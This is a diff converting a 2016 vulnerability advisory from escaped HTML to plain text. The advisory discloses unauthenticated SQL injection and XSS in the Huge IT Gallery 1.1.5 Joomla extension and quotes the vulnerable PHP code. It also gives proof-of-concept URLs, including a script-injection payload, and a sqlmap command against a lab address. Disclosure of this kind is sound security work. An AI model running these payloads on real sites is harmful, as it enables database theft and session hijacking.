@@ -1,45 +1,49 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<title></title>
-<meta name="generator" content="HTML::TextToHTML v2.51"/>
-</head>
-<body>
-<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
-</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
-    white-space: -moz-pre-wrap; /</em> Firefox <em>/
-    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
-    white-space: -o-pre-wrap;   /</em> Opera 7 */
-    word-wrap: break-word;<br/>
-}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 164&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; XSS and SQLi in huge IT gallery v1.1.5 for Joomla&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2016-07-14&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro">http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro</a>"&gt;<a href="http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;huge-it.com&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2016-07-15&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="mailto:info@huge-it.com">info@huge-it.com</a>&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;The plugin allows you to add multiple images to the gallery, create countless galleries, add a description to each of them, as well as make the same things with video links.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;The attacker does not need to be logged in to Joomla to exploit this vulnerability:
-</p><p>SQL in code via id parameter:<br/>
-./administrator/components/com_gallery/models/gallery.php
-</p><pre>
-51     public function getPropertie() {
-52         $db = JFactory::getDBO();
-53         $id_cat = JRequest::getVar(&amp;#039;id&amp;#039;);
-54         $query = $db-&amp;gt;getQuery(true);
-55         $query-&amp;gt;select(&amp;#039;<strong>__huge_itgallery_images.name as name,&amp;</strong>039;
-56                 . &amp;#039;<strong>__huge_itgallery_images.id ,&amp;</strong>039;
-57                 . &amp;#039;<strong>__huge_itgallery_gallerys.name as portName,&amp;</strong>039;
-58                 . &amp;#039;gallery_id, <strong>__huge_itgallery_images.description as description,image_url,sl_url,sl_type,link_target,</strong>__huge_itg    allery_images.ordering,<strong>__huge_itgallery_images.published,published_in_sl_width&amp;</strong>039;);
-59         $query-&amp;gt;from(array(&amp;#039;<strong>__huge_itgallery_gallerys&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_itgallery_gallerys&amp;</strong>039;, &amp;#039;<strong>__huge_itgallery_images&amp;</strong>039; =&amp;gt; &amp;#039;<strong>__huge_itg    allery_images&amp;</strong>039;));
-60         $query-&amp;gt;where(&amp;#039;<strong>__huge_itgallery_gallerys.id = gallery_id&amp;</strong>039;)-&amp;gt;where(&amp;#039;gallery_id=&amp;#039; . $id_cat);
-61         $query-&amp;gt;order(&amp;#039;ordering desc&amp;#039;);
-62 
-64         $db-&amp;gt;setQuery($query);
-65         $results = $db-&amp;gt;loadObjectList();
-66         return $results;
-67     }</pre>
-
-<p>XSS is here:
-</p><p>root@Joomla:/var/www/html<strong> find . -name &amp;quot;<em>.php&amp;quot; -exec grep -l &amp;quot;echo \$<u>GET&amp;quot; {} \;
-./administrator/components/com</u>gallery/views/gallery/tmpl/default.php
-root@Joomla:/var/www/html</strong> find . -name &amp;quot;</em>.php&amp;quot; -exec grep -n &amp;quot;echo \$<u>GET&amp;quot; {} \;
-256:                    &amp;lt;a class=&amp;quot;modal&amp;quot; rel=&amp;quot;{handler: &amp;#039;iframe&amp;#039;, size: {x: 800, y: 500}}&amp;quot; href=&amp;quot;index.php?option=com</u>gallery&amp;amp;view=video&amp;amp;tmpl=component&amp;amp;pid=&amp;lt;?php echo $<u>GET[&amp;#039;id&amp;#039;]; ?&amp;gt;&amp;quot; title=&amp;quot;Image&amp;quot; &amp;gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2016-1000113 2016-1000114&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=164"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;XSS PoC&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//192.168.0.125/administrator/index.php?option=com</u>gallery&amp;amp;view=gallery&amp;amp;id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;SQLi PoC&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: bold; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;http&lt;span style="color: #339933;"&gt;:&lt;/span&gt;&lt;span style="color: #666666; font-style: italic;"&gt;//192.168.0.125/administrator/index.php?option=com_gallery&amp;amp;view=gallery&amp;amp;id=SQLiHERE&lt;/span&gt;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;$ sqlmap &lt;span style="color: #339933;"&gt;--&lt;/span&gt;load&lt;span style="color: #339933;"&gt;-&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;=&lt;/span&gt;cookies&lt;span style="color: #339933;"&gt;.&lt;/span&gt;txt &lt;span style="color: #339933;"&gt;-&lt;/span&gt;u &lt;span style="color: #0000ff;"&gt;&amp;quot;<a href="http://192.168.0.125/administrator/index.php?option=com_gallery&amp;amp;view=gallery&amp;amp;id">http://192.168.0.125/administrator/index.php?option=com_gallery&amp;amp;view=gallery&amp;amp;id</a>=*&amp;quot;&lt;/span&gt; &lt;span style="color: #339933;"&gt;--&lt;/span&gt;dbms &lt;a href="<a href="http://www.php.net/mysql">http://www.php.net/mysql</a>"&gt;&lt;span style="color: #990000;"&gt;mysql&lt;/span&gt;&lt;/a&gt;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href=""&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt;
-&lt;/html&gt;
-</p>
-
-</body>
-</html>
+                                 Advisory #: 164
+Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+Author:Larry W. Cashdollar, @_larry0
+Date: 2016-07-14
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/
+galleries/gallery-pro
+Vendor:huge-it.com
+Vendor Notified: 2016-07-15
+Vendor Contact: info@huge-it.com
+Description: The plugin allows you to add multiple images to the gallery, create
+countless galleries, add a description to each of them, as well as make the same
+things with video links.
+Vulnerability:
+The attacker does not need to be logged in to Joomla to exploit this
+vulnerability: SQL in code via id parameter: ./administrator/components/
+com_gallery/models/gallery.php 51 public function getPropertie() { 52 $db =
+JFactory::getDBO(); 53 $id_cat = JRequest::getVar('id'); 54 $query = $db->getQuery
+(true); 55 $query->select('#__huge_itgallery_images.name as name,' 56 .
+'#__huge_itgallery_images.id ,' 57 . '#__huge_itgallery_gallerys.name as
+portName,' 58 . 'gallery_id, #__huge_itgallery_images.description as
+description,image_url,sl_url,sl_type,link_target,#__huge_itg
+allery_images.ordering,#__huge_itgallery_images.published,published_in_sl_width');
+59 $query->from(array('#__huge_itgallery_gallerys' =>
+'#__huge_itgallery_gallerys', '#__huge_itgallery_images' => '#__huge_itg
+allery_images')); 60 $query->where('#__huge_itgallery_gallerys.id = gallery_id')-
+>where('gallery_id=' . $id_cat); 61 $query->order('ordering desc'); 62 64 $db-
+>setQuery($query); 65 $results = $db->loadObjectList(); 66 return $results; 67 }
+XSS is here: root@Joomla:/var/www/html# find . -name "*.php" -exec grep -l "echo
+\$_GET" {} \; ./administrator/components/com_gallery/views/gallery/tmpl/
+default.php root@Joomla:/var/www/html# find . -name "*.php" -exec grep -n "echo
+\$_GET" {} \; 256: <a class="modal" rel="{handler: 'iframe', size: {x: 800, y:
+500}}" href="index.php?option=com_gallery&view=video&tmpl=component&pid=<?php echo
+$_GET['id']; ?>" title="Image" >
+CVE-2016-1000113 2016-1000114
+JSON:Export
+Exploit Code:
+   1. XSS PoC
+   2. http://192.168.0.125/administrator/
+      index.php?option=com_gallery&view=gallery&id=1--%20%22%3E%3Cscript%3Ealert
+      (1);%3C/script%3E
+   3.  
+   4. SQLi PoC
+   5. http://192.168.0.125/administrator/
+      index.php?option=com_gallery&view=gallery&id=SQLiHERE
+   6.  
+   7. $ sqlmap --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/
+      index.php?option=com_gallery&view=gallery&id=*" --dbms mysql
+Screen Shots:
+Advisory:
